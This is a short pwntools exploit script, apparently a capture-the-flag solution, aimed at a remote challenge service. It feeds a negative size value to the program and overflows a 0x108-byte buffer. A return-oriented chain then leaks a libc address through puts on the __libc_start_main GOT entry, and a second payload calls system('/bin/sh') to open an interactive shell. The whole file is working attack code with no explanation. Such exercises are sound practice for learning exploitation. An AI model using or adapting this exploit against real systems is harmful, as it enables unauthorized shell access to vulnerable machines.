from pwn import *
context.arch = "amd64"
context.os= "linux"

y = remote('eductf.zoolab.org', 10105)
l = ELF('./libc-2.27.so')


pop_rdi = 0x400873
main = 0x400748
puts_plt = 0x4005b0
libc_start_main_got = 0x600ff0
ret = 0x400294

p = flat(
    'a' * 0x108,
    pop_rdi,
    libc_start_main_got,
    puts_plt,
    main
)


y.sendlineafter( 'Size: ', "-2147483648")
y.sendlineafter( "It's safe now :)", p)
y.recvline()
libc = u64(y.recv(6) + '\0\0') - 0x21ab0
l.address = libc
print "libc ==> ", hex(libc)


p = "a"*0x108
p += p64(ret)
p += p64(pop_rdi)
p += p64(l.search('/bin/sh').next())
p += p64(l.sym.system)


y.sendlineafter( 'Size: ', "-2147483648")
y.sendlineafter( "It's safe now :)", p)
y.interactive()

